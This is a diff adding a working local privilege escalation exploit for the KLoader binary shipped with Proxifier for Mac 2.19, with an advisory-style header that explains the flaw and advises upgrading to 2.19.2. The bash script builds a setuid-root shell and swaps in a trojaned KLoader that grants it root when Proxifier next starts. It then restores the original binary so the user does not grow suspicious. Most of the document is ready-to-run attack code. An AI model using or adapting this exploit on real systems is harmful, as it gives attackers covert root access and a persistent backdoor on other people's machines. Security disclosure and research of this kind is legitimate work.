@@ -1,0 +1,87 @@
+# With CVE-2017-7643 I disclosed a command injection vulnerablity in the KLoader
+# binary that ships with Proxifier <= 2.18.
+#
+# Unfortunately 2.19 is also vulnerable to a slightly different attack that
+# yields the same result.
+#
+# When Proxifier is first run, if the KLoader binary is not suid root it gets
+# executed as root by Proxifier.app (the user is prompted to enter an admin
+# password).  The KLoader binary will then make itself suid root so that it
+# doesn't need to prompt the user again.
+#
+# The Proxifier developers added parameter sanitisation and kext signature
+# verification to the KLoader binary as a fix for CVE-2017-7643 but Proxifier.app
+# does no verification of the KLoader binary that gets executed as root.
+#
+# The directory KLoader sits in is not root-owned so we can replace it with
+# our own binary that will get executed as root when Proxifier starts.
+#
+# To avoid raising any suspicion, as soon we get executed as root we can swap
+# the real KLoader binary back into place and forward the execution call on
+# to it.  It does require the user to re-enter their credentials the next time
+# Proxifier is run but it's likely most users wouldn't think anything of this.
+#
+# Users should upgrade to version 2.19.2.
+#
+# https://m4.rkw.io/proxifier_privesc_219.sh.txt
+# 3e30f1c7ea213e0ae1f4046e1209124ee79a5bec479fa23d0b2143f9725547ac
+# -------------------------------------------------------------------
+
+#!/bin/bash
+
+#####################################################################
+# Local root exploit for vulnerable KLoader binary distributed with #
+# Proxifier for Mac v2.19                                           #
+#####################################################################
+# by m4rkw,  shouts to #coolkids :P                                 #
+#####################################################################
+
+cat > a.c <<EOF
+#include <stdio.h>
+#include <unistd.h>
+
+int main()
+{
+  setuid(0);
+  seteuid(0);
+
+  execl("/bin/bash", "bash", NULL);
+  return 0;
+}
+EOF
+
+gcc -o /tmp/a a.c
+
+cat > a.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+
+int main(int ac, char *av[])
+{
+  if (geteuid() != 0) {
+    printf("KLoader: UID not set to 0\n");
+    return 104;
+  } else {
+    seteuid(0);
+    setuid(0);
+
+    chown("/tmp/a", 0, 0);
+    chmod("/tmp/a", strtol("4755", 0, 8));
+    rename("/Applications/Proxifier.app/Contents/KLoader2", "/Applications/Proxifier.app/Contents/KLoader");
+    chown("/Applications/Proxifier.app/Contents/KLoader", 0, 0);
+    chmod("/Applications/Proxifier.app/Contents/KLoader", strtol("4755", 0, 8));
+    execv("/Applications/Proxifier.app/Contents/KLoader", av);
+
+    return 0;
+  }
+}
+EOF
+
+mv -f /Applications/Proxifier.app/Contents/KLoader /Applications/Proxifier.app/Contents/KLoader2
+gcc -o /Applications/Proxifier.app/Contents/KLoader a.c
+rm -f a.c
+
+echo "Backdoored KLoader installed, the next time Proxifier starts /tmp/a will become suid root."
